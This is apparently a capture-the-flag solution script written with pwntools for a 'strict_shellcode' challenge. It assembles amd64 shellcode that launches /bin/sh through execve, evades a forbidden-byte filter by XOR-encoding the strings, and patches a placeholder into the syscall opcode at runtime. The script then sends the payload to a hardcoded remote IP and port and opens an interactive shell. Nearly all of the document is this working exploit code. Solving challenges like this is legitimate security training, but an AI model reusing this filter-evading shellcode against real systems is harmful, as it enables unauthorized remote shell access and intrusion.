from pwn import *

"""
since we cannot use certain bytes,
we place the /bin/sh string using a xored alternative,
and we use a placeholder (.ascii "\x02\x01") for syscall.
at the beginning, rax points to the beginning of the code,
so rax + 0x3e is the .ascii "\x02\x01" code (just 2 bytes),
thus adding 0x40d to the actual value, [rax + 0x3e],
will get us the opcode for syscall, 0x50f
"""

def check(sc):
    assert len(sc) <= 70
    assert "\x00" not in sc
    assert "\x39" not in sc
    assert "\x62" not in sc
    assert "\x69" not in sc
    assert "\x0F" not in sc
    assert "\x05" not in sc


context(arch='amd64', os='linux')

# io = process("./strict_shellcode")
io = remote("141.85.224.103", 31337)


shellcode = asm(
    """
    // execve(rdi: /bin///sh, rsi: sh, rdx: NULL)
    // rax contains the stack address of the buffer, USE IT!

    // gimme syscall
    mov bx, 0x40d
    add [rax+0x3e], bx

    // rdi: /bin///sh
    push 0x68
    mov rdx, 0x732f2f2f6f68632e
    push rdx
    xor dword ptr [rsp], 0x1010101
    mov rdi, rsp

    // rsi: sh
    push 0x1111010 ^ 0x6873
    xor dword ptr [rsp], 0x1111010
    xor esi, esi
    push rsi
    push 8
    pop rsi
    add rsi, rsp
    push rsi
    mov rsi, rsp

    // rdx: NULL
    xor rdx, rdx

    // syscall number
    push 59
    pop rax

    // syscall
    .ascii "\x02\x01"
    """
)


check(shellcode)

io.send(shellcode)
io.interactive()
